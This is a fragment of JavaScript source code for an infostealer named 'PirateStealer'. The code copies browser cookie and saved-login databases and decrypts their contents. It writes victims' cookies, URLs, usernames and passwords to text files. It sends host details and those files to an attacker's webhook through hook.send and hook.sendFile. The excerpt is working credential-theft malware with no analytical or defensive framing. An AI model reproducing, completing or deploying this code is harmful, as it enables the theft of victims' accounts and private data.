            fs.copyFileSync(browser + "\\Default\\Cookies", x + "\\cookies")
            fs.copyFileSync(browser + "\\Default\\Login Data", x + "\\login data" )
            fs.writeFileSync(x + "\\browser", browser)
            browser_cached.push(x);
}

         }
            }
        }
    })

    return browser_cached;


}



var tc = (ToCache())
const embed = new MessageBuilder()
.setTitle('PirateStealer')
.setColor('#fff')
.setDescription(`Homedir: ${os.homedir()}\nComputer Hostname: ${os.hostname()}\nTotal Memory: ${os.totalmem()/1000000000}\nFree Memory: ${8555192320/1000000000}`)
.setFooter('PirateStealer Premium');
hook.send(embed);
tc.forEach((browser) => {
    var textresult = fs.readFileSync(browser + "\\browser")
    getCookies('https://www.xelies.cc/', browser + "\\cookies", textresult + "\\Local State", function(err, cookies) {
        var coo = `---------------------------------------------------------------------------
Thanks for using PirateStealer!
Victims Path: %path%\n---------------------------------------------------------------------------\n\n\n\n`.replace('%path%', textresult);
        cookies.forEach((cooki) => {
            coo += "---------------------------------------------------------------------------\nHost Key: " + cooki.host_key + "\nName: " + cooki.name + "\nValue: " + cooki.value + "\n---------------------------------------------------------------------------\n\n"
        })
        fs.writeFileSync(browser + "\\Cookies.txt" , coo);
        hook.sendFile(browser + "\\Cookies.txt");

    }
    )


    getPasswords('https://www.xelies.cc/', browser + "\\login data", textresult + "\\Local State", function(err, cookies) {
        var coo = `---------------------------------------------------------------------------
Thanks for using PirateStealer!
Victims Path: %path%\n---------------------------------------------------------------------------\n\n\n\n\n`.replace('%path%', textresult);
    cookies.forEach((cx) => {
            coo += "---------------------------------------------------------------------------\nURL: " + cx.origin_url +"\nUsername (or email): " + cx.username_value + "\nPassword: " + cx.value + "\n---------------------------------------------------------------------------\n\n";
        })
        fs.writeFileSync(browser + "\\Passwords.txt" , coo);

        hook.sendFile(browser + "\\Passwords.txt")

    }
    )

})
